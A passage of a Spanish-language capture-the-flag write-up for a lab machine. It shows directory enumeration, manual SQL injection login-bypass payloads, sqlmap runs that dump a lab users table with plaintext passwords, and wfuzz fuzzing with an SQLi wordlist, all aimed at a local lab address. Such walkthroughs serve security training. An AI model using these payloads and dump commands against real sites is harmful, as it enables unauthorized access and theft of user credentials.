+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://192.168.10.220/images/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4145<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/login.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2543<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/admin.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 359<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">882180</span> / <span style="color:#ae81ff">882184</span> <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-x</em></td>
+					<td>Para indicar extensiones de archivos a buscar.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Encontramos dos páginas, pero solo podremos ver el contenido de la página <strong>login.php</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-bocataCalamar/Captura5.png">
+</p>
+<p>Es probable que tengamos que aplicar <strong>Inyecciones SQL</strong>.</p>
+<p>Intentémoslo.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="SQLi">Aplicando Inyecciones SQL de Distintas Maneras</h3>
+<p>Vamos a aplicar <strong>Inyecciones SQL</strong> de manera manual y automatizada, empezando por la forma manual.</p>
+<h4 id="SQLiManual">Aplicando Inyección SQL Básica de Forma Manual para Ganar Acceso a Login</h4>
+<p>Veamos qué sucede si metemos un usuario y contraseña como <strong>admin-admin</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-bocataCalamar/Captura6.png">
+</p>
+<p>No son correctos.</p>
+<p>Bien, pero ahora intentemos meter una comilla al usuario o a la contraseña y veamos qué pasa:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-bocataCalamar/Captura7.png">
+</p>
+<p>Nos muestra que hay un error en la sintaxis y nos muestra la ruta en donde está <strong>login.php</strong>.</p>
+<p>Entonces, es posible que la query sea vulnerable a <strong>Inyecciones SQL</strong>.</p>
+<p>Es posible que esta sea la query que se está utilizando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SELECT * FROM users WHERE <span style="color:#f92672">(</span>alias <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$alias&#39;</span> OR email <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$email&#39;</span><span style="color:#f92672">)</span> AND password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$contraseña&#39;</span>;
+</span></span></code></pre></div><p>Esta query indica que si el usuario y la contraseña son correctos o <strong>true</strong>, entonces, nos da acceso.</p>
+<p>Podemos tratar de modificar esta query con cualquiera de las siguientes inyecciones:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#39; or 1=1--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1-- -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>-- -
+</span></span></code></pre></div><p>Esta modificación indica que <strong>&ldquo;o 1 es igual 1&rdquo;</strong>, lo que obviamente es verdadero.</p>
+<p>Esto se interpretaría como: <strong>&ldquo;Si el usuario y la contraseña o 1 es igual 1 son verdadero (true), concede el acceso&rdquo;</strong>.</p>
+<p>Ahora, necesitamos saber cuál de los dos campos es vulnerable, por lo que podemos probar esta inyección en el usuario o en la contraseña o incluso en ambos.</p>
+<p>Pruebalo:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-bocataCalamar/Captura8.png">
+</p>
+<p>Ganamos acceso. Lo probé en los dos campos (en cada campo y luego en los dos) y me dio el acceso, entonces, podríamos suponer que ambos son vulnerables, pero si lo pruebas con <strong>BurpSuite</strong>, resulta que el campo vulnerable es el <strong>campo del usuario</strong>.</p>
+<h4 id="SQLMAP">Automatizando Inyecciones SQL con SQLMAP para Dumpear Datos de Base de Datos</h4>
+<p>Independientemente de si hicimos pruebas en el login para saber si es vulnerable a <strong>Inyecciones SQL</strong>, pudimos haber usado la herramienta <strong>SQLMAP</strong> para que hiciera pruebas automatizadas, y es lo que haremos a continuación.</p>
+<p>Para que funcione de una mejor manera, vamos a capturar y a guardar en un archivo de texto la petición del login cuando intentamos entrar con credenciales random.</p>
+<p>Puedes utilizar <strong>BurpSuite</strong> para esto:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-bocataCalamar/Captura14.png">
+</p>
+<p>Quedaría el archivo de la siguiente manera:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano request.txt
+</span></span><span style="display:flex;"><span>----------------
+</span></span><span style="display:flex;"><span>POST /login.php HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 192.168.10.220
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:128.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/128.0
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,*/*;q<span style="color:#f92672">=</span>0.8
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">26</span>
+</span></span><span style="display:flex;"><span>Origin: http://192.168.10.220
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Referer: http://192.168.10.220/login.php
+</span></span><span style="display:flex;"><span>Cookie: PHPSESSID<span style="color:#f92672">=</span>uhaksjdunefpt1is3jkad70
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Priority: u<span style="color:#f92672">=</span>0, i
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>alias<span style="color:#f92672">=</span>admin&amp;password<span style="color:#f92672">=</span>admin
+</span></span></code></pre></div><p>Con <strong>SQLMAP</strong> le vamos a indicar que pruebe si el login es vulnerable a <strong>Inyecciones SQL</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r request.txt --batch
+</span></span><span style="display:flex;"><span>        ___
+</span></span><span style="display:flex;"><span>       __H__
+</span></span><span style="display:flex;"><span> ___ ___<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]_____ ___ ___  {1.9.4#stable}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_ -| . [.]     | .&#39;| . |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|___|_  [&#34;</span><span style="color:#f92672">]</span>_|_|_|__,|  _|
+</span></span><span style="display:flex;"><span>      |_|V...       |_|   https://sqlmap.org
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>POST parameter <span style="color:#e6db74">&#39;alias&#39;</span> is vulnerable. Do you want to keep testing the others <span style="color:#f92672">(</span><span style="color:#66d9ef">if</span> any<span style="color:#f92672">)</span>? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span> N
+</span></span><span style="display:flex;"><span>sqlmap identified the following injection point<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> with a total of <span style="color:#ae81ff">265</span> HTTP<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> requests:
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>Parameter: alias <span style="color:#f92672">(</span>POST<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Type: boolean-based blind
+</span></span><span style="display:flex;"><span>    Title: OR boolean-based blind - WHERE or HAVING clause <span style="color:#f92672">(</span>MySQL comment<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Payload: alias<span style="color:#f92672">=</span>-9105<span style="color:#e6db74">&#39; OR 6739=6739#&amp;password=admin
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: error-based
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: alias=admin&#39;</span> AND GTID_SUBSET<span style="color:#f92672">(</span>CONCAT<span style="color:#f92672">(</span>0x7162787171,<span style="color:#f92672">(</span>SELECT <span style="color:#f92672">(</span>ELT<span style="color:#f92672">(</span>1050<span style="color:#f92672">=</span>1050,1<span style="color:#f92672">)))</span>,0x717a717671<span style="color:#f92672">)</span>,1050<span style="color:#f92672">)</span>-- bMcE&amp;password<span style="color:#f92672">=</span>admin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Type: time-based blind
+</span></span><span style="display:flex;"><span>    Title: MySQL &gt;<span style="color:#f92672">=</span> 5.0.12 AND time-based blind <span style="color:#f92672">(</span>query SLEEP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Payload: alias<span style="color:#f92672">=</span>admin<span style="color:#960050;background-color:#1e0010">&#39;</span> AND <span style="color:#f92672">(</span>SELECT <span style="color:#ae81ff">7967</span> FROM <span style="color:#f92672">(</span>SELECT<span style="color:#f92672">(</span>SLEEP<span style="color:#f92672">(</span>5<span style="color:#f92672">)))</span>ESNY<span style="color:#f92672">)</span>-- fcQV&amp;password<span style="color:#f92672">=</span>admin
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:43:04<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> the back-end DBMS is MySQL
+</span></span><span style="display:flex;"><span>web server operating system: Linux Ubuntu
+</span></span><span style="display:flex;"><span>web application technology: Nginx 1.24.0
+</span></span><span style="display:flex;"><span>back-end DBMS: MySQL &gt;<span style="color:#f92672">=</span> 5.6
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 13:43:04 /2025-07-24/
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-r</em></td>
+					<td>Usa un archivo de solicitud HTTP (incluye headers, cookies, etc.).</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;batch</em></td>
+					<td>Ejecuta el comando sin solicitar confirmaciones al usuario.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Como lo mencioné antes, el campo del usuario es el vulnerable a <strong>Inyecciones SQL</strong>.</p>
+<p>Tratemos de dumpear las bases de datos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r request.txt --batch --dbs 
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>available databases <span style="color:#f92672">[</span>3<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> information_schema
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> performance_schema
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> php
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 13:45:56 /2025-07-24/
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-r</em></td>
+					<td>Usa un archivo de solicitud HTTP (incluye headers, cookies, etc.).</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;batch</em></td>
+					<td>Ejecuta el comando sin solicitar confirmaciones al usuario.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;dbs</em></td>
+					<td>Enumera todas las bases de datos disponibles.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Dumpeemos las tablas de la base de datos <strong>php</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r request.txt --batch -D <span style="color:#e6db74">&#39;php&#39;</span> --tables
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:46:27<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching tables <span style="color:#66d9ef">for</span> database: <span style="color:#e6db74">&#39;php&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:46:27<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: <span style="color:#e6db74">&#39;usuarios&#39;</span>
+</span></span><span style="display:flex;"><span>Database: php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> table<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| usuarios |
+</span></span><span style="display:flex;"><span>+----------+
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 13:46:27 /2025-07-24/
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-r</em></td>
+					<td>Usa un archivo de solicitud HTTP (incluye headers, cookies, etc.).</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;batch</em></td>
+					<td>Ejecuta el comando sin solicitar confirmaciones al usuario.</td>
+			</tr>
+			<tr>
+					<td><em>-D</em></td>
+					<td>Selecciona una base de datos especifica a enumerar.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;tables</em></td>
+					<td>Enumera las tablas de una base de datos específica.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Tenemos la tabla <strong>usuarios</strong>.</p>
+<p>Ahora, dumpeemos las columnas de esa tabla:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r request.txt --batch -D <span style="color:#e6db74">&#39;php&#39;</span> -T <span style="color:#e6db74">&#39;usuarios&#39;</span> --columns
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Database: php
+</span></span><span style="display:flex;"><span>Table: usuarios
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">5</span> columns<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+------------+-------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| Column     | Type        |
+</span></span><span style="display:flex;"><span>+------------+-------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| contraseña | varchar<span style="color:#f92672">(</span>16<span style="color:#f92672">)</span> |
+</span></span><span style="display:flex;"><span>| alias      | varchar<span style="color:#f92672">(</span>20<span style="color:#f92672">)</span> |
+</span></span><span style="display:flex;"><span>| email      | varchar<span style="color:#f92672">(</span>30<span style="color:#f92672">)</span> |
+</span></span><span style="display:flex;"><span>| id         | int         |
+</span></span><span style="display:flex;"><span>| nombre     | varchar<span style="color:#f92672">(</span>20<span style="color:#f92672">)</span> |
+</span></span><span style="display:flex;"><span>+------------+-------------+
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 13:47:03 /2025-07-24/
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-r</em></td>
+					<td>Usa un archivo de solicitud HTTP (incluye headers, cookies, etc.).</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;batch</em></td>
+					<td>Ejecuta el comando sin solicitar confirmaciones al usuario.</td>
+			</tr>
+			<tr>
+					<td><em>-D</em></td>
+					<td>Selecciona una base de datos especifica a enumerar.</td>
+			</tr>
+			<tr>
+					<td><em>-T</em></td>
+					<td>Selecciona una tabla especifica a enumerar.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;columns</em></td>
+					<td>Enumera las columnas de una tabla específica.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Vamos a dumpear todos los datos de esa tabla:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r request.txt --batch -D <span style="color:#e6db74">&#39;php&#39;</span> -T <span style="color:#e6db74">&#39;usuarios&#39;</span> --dump
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Database: php
+</span></span><span style="display:flex;"><span>Table: usuarios
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">4</span> entries<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+----+------------+---------------------+---------+--------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| id | alias      | email               | nombre  | contraseña   |
+</span></span><span style="display:flex;"><span>+----+------------+---------------------+---------+--------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">1</span>  | adminPrinc | admin@localhost.com | admin   | <span style="color:#ae81ff">123456</span>       |
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">2</span>  | Pep100     | pepe@email.com      | pepe    | qwertyuiop   |
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">3</span>  | Jaime_P    | jaime@email.com     | jaime   | jaime        |
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">4</span>  | Richard    | Ricardobc@gmail.com | Ricardo | qwertyu      |
+</span></span><span style="display:flex;"><span>+----+------------+---------------------+---------+--------------+
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-r</em></td>
+					<td>Usa un archivo de solicitud HTTP (incluye headers, cookies, etc.).</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;batch</em></td>
+					<td>Ejecuta el comando sin solicitar confirmaciones al usuario.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;dbs</em></td>
+					<td>Enumera todas las bases de datos disponibles.</td>
+			</tr>
+			<tr>
+					<td><em>-D</em></td>
+					<td>Selecciona una base de datos específica a enumerar.</td>
+			</tr>
+			<tr>
+					<td><em>-T</em></td>
+					<td>Selecciona una tabla específica a enumerar.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;dump</em></td>
+					<td>Extraer datos de una tabla específica.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Muy bien, y como ya conocemos los datos que necesitamos, podemos dumpear solamente el alias, email y la contraseña:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r request.txt --batch -D <span style="color:#e6db74">&#39;php&#39;</span> -T <span style="color:#e6db74">&#39;usuarios&#39;</span> -C alias,email,contraseña --dump
+</span></span><span style="display:flex;"><span>Database: php
+</span></span><span style="display:flex;"><span>Table: usuarios
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">4</span> entries<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+------------+--------------+---------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| alias      | contraseña   | email               |
+</span></span><span style="display:flex;"><span>+------------+--------------+---------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| adminPrinc | <span style="color:#ae81ff">123456</span>       | admin@localhost.com |
+</span></span><span style="display:flex;"><span>| Jaime_P    | jaime        | jaime@email.com     |
+</span></span><span style="display:flex;"><span>| Pep100     | qwertyuiop   | pepe@email.com      |
+</span></span><span style="display:flex;"><span>| Richard    | qwertyu      | Ricardobc@gmail.com |
+</span></span><span style="display:flex;"><span>+------------+--------------+---------------------+
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 16:02:34 /2025-07-24/
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-r</em></td>
+					<td>Usa un archivo de solicitud HTTP (incluye headers, cookies, etc.).</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;batch</em></td>
+					<td>Ejecuta el comando sin solicitar confirmaciones al usuario.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;dbs</em></td>
+					<td>Enumera todas las bases de datos disponibles.</td>
+			</tr>
+			<tr>
+					<td><em>-D</em></td>
+					<td>Selecciona una base de datos específica a enumerar.</td>
+			</tr>
+			<tr>
+					<td><em>-T</em></td>
+					<td>Selecciona una tabla específica a enumerar.</td>
+			</tr>
+			<tr>
+					<td><em>-C</em></td>
+					<td>Selecciona los datos de una columna específica a enumerar.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;dump</em></td>
+					<td>Extraer datos de una tabla específica.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Por último, podemos automatizar todo esto y obtener los datos de la base de datos usada en un formulario, pero tenemos que usar la <strong>URL</strong> directamente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#39;http://192.168.10.220/login.php&#39;</span> --batch --forms --dump
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Database: php
+</span></span><span style="display:flex;"><span>Table: usuarios
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">4</span> entries<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+----+------------+---------------------+---------+--------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| id | alias      | email               | nombre  | contraseña   |
+</span></span><span style="display:flex;"><span>+----+------------+---------------------+---------+--------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">1</span>  | adminPrinc | admin@localhost.com | admin   | <span style="color:#ae81ff">123456</span>       |
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">2</span>  | Pep100     | pepe@email.com      | pepe    | qwertyuiop   |
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">3</span>  | Jaime_P    | jaime@email.com     | jaime   | jaime        |
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">4</span>  | Richard    | Ricardobc@gmail.com | Ricardo | qwertyu      |
+</span></span><span style="display:flex;"><span>+----+------------+---------------------+---------+--------------+
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 16:24:24 /2025-07-24/
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Define la URL objetivo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;batch</em></td>
+					<td>Ejecuta el comando sin solicitar confirmaciones al usuario.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;forms</em></td>
+					<td>Analiza y prueba formularios en la URL objetivo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;dump</em></td>
+					<td>Extraer datos de una tabla específica.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Podemos probar esos usuarios para entrar al login.</p>
+<h4 id="wfuzz">Aplicando Fuzzing a Campo Vulnerable a SQLi con wfuzz</h4>
+<p>Otra cosa que podemos hacer para probar si un campo es vulnerable a <strong>Inyecciones SQL</strong>, es utilizar un wordlist que contenga distintas inyecciones y una herramienta que ejecute ese wordlist.</p>
+<p>Para estos casos, la herramienta <strong>wfuzz</strong> es bastante útil.</p>
+<p>Utilizaremos un wordlist de <strong>SecLists</strong> que se encuentra en la ruta <code>/seclists/Fuzzing/SQLi/quick-SQLi.txt</code>.</p>
+<p>Y como sabemos que al ganar acceso al login, nos redirecciona a otra página, entonces podemos agregar el <strong>código 200</strong> como un filtro para que no los muestre y capture respuestas distintas.</p>
+<p>O también podemos agregar un filtro para que solo nos dé las respuestas con <strong>código 302</strong>.</p>
+<p>Esto ya es como a ti te guste.</p>
+<p>Probemos con el filtro de <strong>código 302</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c -t <span style="color:#ae81ff">300</span> -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/quick-SQLi.txt -d <span style="color:#e6db74">&#39;alias=FUZZ&amp;password=admin&#39;</span> --sc <span style="color:#ae81ff">302</span> http://192.168.10.220/login.php
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://192.168.10.220/login.php
+</span></span><span style="display:flex;"><span>Total requests: 77
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                                                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000043:   <span style="color:#ae81ff">302</span>        <span style="color:#ae81ff">97</span> L     <span style="color:#ae81ff">204</span> W      <span style="color:#ae81ff">2536</span> Ch     <span style="color:#e6db74">&#34;admin&#39;or 1=1 or &#39;&#39;=&#39;&#34;</span>                                                                                                       
+</span></span><span style="display:flex;"><span>000000041:   <span style="color:#ae81ff">302</span>        <span style="color:#ae81ff">97</span> L     <span style="color:#ae81ff">204</span> W      <span style="color:#ae81ff">2536</span> Ch     <span style="color:#e6db74">&#34;admin&#39; or &#39;1&#39;=&#39;1&#39;#&#34;</span>                                                                                                         
+</span></span><span style="display:flex;"><span>000000046:   <span style="color:#ae81ff">302</span>        <span style="color:#ae81ff">97</span> L     <span style="color:#ae81ff">204</span> W      <span style="color:#ae81ff">2536</span> Ch     <span style="color:#e6db74">&#34;admin&#39; or 1=1#&#34;</span>                                                                                                             
